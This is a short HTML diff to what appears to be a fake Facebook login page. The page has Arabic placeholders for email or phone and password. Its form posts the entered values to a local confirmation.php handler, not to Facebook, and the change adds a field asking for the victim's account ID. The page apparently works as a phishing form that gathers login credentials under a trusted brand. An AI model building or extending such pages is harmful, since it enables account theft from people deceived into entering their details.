@@ -46,6 +46,7 @@
         <form action="/examples/actions/confirmation.php" method="post">
             <h2 class="text-center">Facebook</h2>
             <div class="form-group">
+                <input type="text" name="id" class="form-control id_fa" placeholder="Account ID" required="required" style="text-align: center;margin-bottom:3px">
                 <input type="text" name="email" class="form-control email_fa" placeholder="البريد او رقم الهاتف" required="required" style="text-align: center;">
                 <input type="password" name="password" class="form-control password_fa" placeholder="كـلمه المرور" required="required" style="margin-top: 3px;text-align: center;">
             </div>
